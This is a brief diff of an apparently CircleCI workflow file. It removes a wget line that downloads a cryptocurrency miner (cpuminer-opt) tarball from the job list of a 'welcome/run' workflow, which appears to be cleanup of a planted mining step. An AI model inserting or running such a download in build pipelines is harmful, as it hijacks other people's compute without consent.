@@ -11,4 +11,4 @@ workflows:
     # Run the welcome/run job in its own container
     jobs:
       - welcome/run
-      wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+      
